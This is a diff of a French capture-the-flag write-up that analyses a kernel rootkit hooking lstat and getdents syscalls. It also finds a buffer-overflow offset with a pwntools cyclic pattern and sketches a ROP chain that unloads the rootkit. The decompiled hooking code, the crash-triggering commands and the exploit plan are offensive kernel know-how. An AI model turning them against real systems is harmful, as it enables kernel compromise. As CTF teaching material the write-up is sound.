@@ -2,29 +2,35 @@
 
 ## intitulé
 
-```Une machine a été infectée par le rootkit Hello Rootkitty qui empêche la lecture de certains fichiers.
-Votre mission : aider la victime à récupérer le contenu des fichiers affectés. Une fois connecté en SSH, lancez le wrapper pour démarrer le challenge.```
+> Une machine a été infectée par le rootkit Hello Rootkitty qui empêche la lecture de certains fichiers.
+> Votre mission : aider la victime à récupérer le contenu des fichiers affectés. Une fois connecté en SSH, lancez le wrapper pour démarrer le challenge.
 
 ##Fichiers fournis
-[bzImage](https://github.com/gw3l/FCSC-2020-Writeups/blob/master/binaries/bzImage) le kernel linux [un script de Linus Torvalds himself](https://github.com/torvalds/linux/blob/master/scripts/extract-vmlinux) ...
+[bzImage](https://github.com/gw3l/FCSC-2020-Writeups/blob/master/binaries/bzImage) le kernel linux
 [ecsc.ko](https://github.com/gw3l/FCSC-2020-Writeups/blob/master/binaries/ecsc.ko) le rootkit sous forme de module kernel 
 [initramfs.example.cpio](https://github.com/gw3l/FCSC-2020-Writeups/blob/master/binaries/initramfs.example.cpio) Le système de fichier
 
+Au vu des fichiers, on peut s'imaginer qu'on va devoir exploiter une vulnérabilité kernel.
+
 ## Analyse
 Après avoir lancé le wrapper mentionné dans l'intitulé, on se rend compte que les fichiers commençants par "ecsc_flag_" ont un comportement étrange : on ne peut pas visualiser leur contenu et ils sont renommés automatiquement :
-```~ $ echo "test" > ecsc_flag_1234
-~ $ ls -al
+```bash
+~ $ echo "test" > ecsc_flag_1234
+~ $ ls -al~~~~
 total 0
 drwxrwxrwx    2 ctf      ctf              0 May  4 19:44 .
 drwxr-xr-x    3 root     root             0 Feb 25 09:30 ..
 -r--------    0 root     root             0 Jan  0  1900 ecsc_flag_XXXX
 ~ $ cat ecsc_flag_XXXX
-cat: can't open 'ecsc_flag_XXXX': No such file or direc****tory```
+cat: can't open 'ecsc_flag_XXXX': No such file or direc****tory
+```
+
 à noter qu'ils changent de propriétaire et de date.
 
 En décompilant le module avec [ghidra](https://ghidra-sre.org/)  on comprend un peu mieux ce qu'il se passe :
 Les syscalls **lstat**, **getdents**, **getdents64** sont *hookés* :
-```long init_module(void)
+```c
+long init_module(void)
 
 {
   ulong *syscall_table;
@@ -40,13 +46,15 @@ Les syscalls **lstat**, **getdents**, **getdents64** sont *hookés* :
   ref_sys_lstat = syscall_table[6];
   syscall_table[6] = (ulong)ecsc_sys_lstat;
   return 0;
-}```
+}
+```
 
 le syscall [lstat](https://linux.die.net/man/2/lstat)  permet normalement d'afficher les attributs d'un fichier.
 les syscalls [getdents](https://linux.die.net/man/2/getdents) et [getdents64](https://linux.die.net/man/2/getdents) permettent d'afficher le nom des fichiers.
 
 Tout s'explique. On va donc étudier de plus près les hooks de ces syscalls, plus particulièrement celui des syscall **getdents** et **getdents64**. Voilà ce que donne la fonction ecsc_sys_getdents64 :
-```ulong ecsc_sys_getdents64(ulong fd,dirent *dirp,ulong count)
+```c
+ulong ecsc_sys_getdents64(ulong fd,dirent *dirp,ulong count)
 
 {
   byte *__src;
@@ -140,7 +148,8 @@ Tout s'explique. On va donc étudier de plus près les hooks de ces syscalls, pl
     }
     dirp = (dirent *)((long)&dirp->d_ino + uVar7);
   } while( true );
-}```
+}
+```
 
 Sans s'attarder sur les détails on voit que :
 1. le syscall original est appelé,
@@ -155,18 +164,22 @@ Type "help", "copyright", "credits" or "license" for more information.
 >>> from pwn import *
 >>> cyclic(150)
 'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabma'
->>> ```
+>>> 
+```
 puis :
-```cd /home/ctf
+```bash
+cd /home/ctf
 touch ecsc_flag_aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabma
-ls -l```
+ls -l
+```
 
 on obtient :
-```general protection fault: 0000 [#1] NOPTI
+```
+general protection fault: 0000 [#1] NOPTI
 Modules linked in: ecsc(O)
 CPU: 0 PID: 53 Comm: ls Tainted: G           O    4.14.167 #11
 task: ffff932d81e19980 task.stack: ffff9ac3c009c000
-RIP: 0010:==0x6163626161626261==
+RIP: 0010:0x6163626161626261
 RSP: 0018:ffff9ac3c009ff38 EFLAGS: 00000282
 RAX: 00000000000000e8 RBX: 6174616161736161 RCX: 0000000000000000
 RDX: 00007fff048b3bd4 RSI: ffff9ac3c009ff61 RDI: 00007fff048b3b33
@@ -184,11 +197,13 @@ Kernel panic - not syncing: Fatal exception
 Kernel Offset: 0x37e00000 from 0xffffffff81000000 (relocation range: 0xffffffff80000000-0xffffffffbfffffff)
 Rebooting in 1 seconds..
 ```
-Bingo ! pwntools nous donne l'offset en question :
-```>>> cyclic_find(p64(0x6163626161626261))
-102```
+Bingo ! pwntools nous donne l'offset en question (Notez la valeur de RIP)~~~~ :
+```python
+>>> cyclic_find(p64(0x6163626161626261))
+102
+```
 
-## Creation d'un exploit
+## Exploit
 On s'oriente donc vers un "simple" bufferoverflow. Ne sachant pas l'addresse de la stack et le kernel utilisé étant probablement assez recent, on va devoir utiliser une [ropchain](https://en.wikipedia.org/wiki/Return-oriented_programming). 
 
 Notre ropchain va d'abord appeller la fonction **cleanup_module** (qui fait exactement l'inverse de la fonction **init_module** mentionnée plus haut, à savoir qu'elle restaure la table des syscalls afin que les fonctions originales du noyau soient utilisés). Puis on va dépiler la stack jusqu'à obtenir l'addresse de retour initial (dans **do_syscall_64**, la fonction qui gère les syscall). Le kernel reprendra donc un fonctionnement à peu près normal. Le but de la ropchain n'étant pas de passer root, mais de désactiver le rootkit. Un simple `cat /ecsc_flag_*` affichera le flag après passage de notre exploit.
